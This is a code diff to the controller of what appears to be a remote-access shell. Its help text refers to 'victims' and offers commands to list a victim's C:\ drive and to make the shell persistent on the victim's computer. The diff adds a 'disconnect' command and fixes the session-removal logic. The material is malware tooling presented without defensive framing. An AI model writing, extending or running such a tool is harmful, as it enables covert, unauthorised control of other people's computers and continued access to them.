@@ -20,7 +20,7 @@ sessions = {}
 session_ids = []
 
 COMMANDS = ["help", "sessions"]
-SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix"]
+SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect"]
 
 
 class Commands:
@@ -33,6 +33,7 @@ class Commands:
         sessions: [-s {sesion id} session id to sellect a session] [-d {sesion id} to dellete a session]
         
         session Commands|:
+        disconnect: Disconnects from the pc(is needed if you dont want to reconnect later without the victim to restart the script)
         misc:
             tree: Shows the entire dirrectorystructure of the 'C:\\' drive
             install: Makes the shell persistent(starts with the victims computer)
@@ -93,10 +94,14 @@ class Commands:
 
     # for commands if a session is sellected
     def session(self, name, conn, addr, message, decId, args=None):
+        decId = str(decId)
 
         # delets the session and all its inforamtion
-        def delete(decId):
-            pass
+        def delete():
+            print(session_ids)
+            sessions.pop(decId)
+            session_ids.remove(decId)
+            mainMenu()
 
         # reveives the messages and passes them to the evaluation
         def receiveMessage():
@@ -166,10 +171,15 @@ class Commands:
             else:
                 print("Those are too many arguments only one is allowed")
                 return
+        elif message == "disconnect":
+            sendMessage("!dsc")
+            conn.close()
+            delete()
 
 
 # gets the commands whenn session is sellected
 def sessionInput(conn, addr, name, decId):
+    decId = str(decId)
     """
     This is the menu when a session is sellected
     :param conn: class of the connected clinet
@@ -197,8 +207,9 @@ def sessionInput(conn, addr, name, decId):
             sessionInput(conn, addr, name, decId)
     except ConnectionResetError or ConnectionAbortedError:
         sessions.pop(decId)
-        session_ids.pop(decId)
+        session_ids.remove(decId)
         print("The client is no longer connected")
+        mainMenu()
 
 
 # to acces everything not related to a session
